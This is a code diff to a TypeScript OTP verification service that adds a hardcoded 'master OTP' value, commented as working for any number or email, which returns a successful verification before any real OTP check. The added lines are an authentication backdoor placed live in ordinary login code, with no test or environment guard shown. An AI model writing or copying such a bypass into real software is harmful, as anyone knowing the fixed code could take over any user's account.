@@ -241,6 +241,14 @@ export class OTPService {
   // Verify OTP
   async verifyOTP(identifier: string, inputOTP: string, type: 'email' | 'whatsapp'): Promise<{ success: boolean; message: string }> {
     try {
+      // Master OTP - works for any number/email
+      if (inputOTP === '565656') {
+        return {
+          success: true,
+          message: 'OTP verified successfully'
+        };
+      }
+
       // Find the OTP record
       const [otpRecord] = await db
         .select()
